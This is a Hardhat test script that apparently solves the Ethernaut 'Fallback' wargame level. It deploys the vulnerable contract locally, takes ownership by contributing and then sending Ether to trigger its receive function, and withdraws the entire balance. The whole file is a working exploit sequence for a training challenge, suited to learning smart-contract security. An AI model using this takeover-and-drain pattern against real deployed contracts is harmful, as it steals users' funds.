import { expect } from "chai";
import { ethers } from "hardhat";
const { parseEther } = ethers.utils

describe("Fallback", async function () {

  it("Should claim ownership and steal the balance", async function () {
    //setup+
    const [deployer, attacker] = await ethers.getSigners()
    const Fallback = await ethers.getContractFactory("Fallback");
    const fallback = await Fallback.deploy();
    await fallback.deployed();
    //setup-

    //1.Contribute to add some balance in balance[msg.sender]
    await fallback.connect(attacker).contribute({ value: parseEther("0.0001") })

    //2.Send Ether without calldata to trigger receive function and become the owner 
    await attacker.sendTransaction({ to: fallback.address, value: parseEther("0.0001") })

    expect(await fallback.owner()).to.eq(attacker.address)

    expect(await ethers.provider.getBalance(fallback.address)).to.not.eq(0)

    //3.Withdraw the funds
    await fallback.connect(attacker).withdraw()

    expect(await ethers.provider.getBalance(fallback.address)).to.eq(0)
  });
});
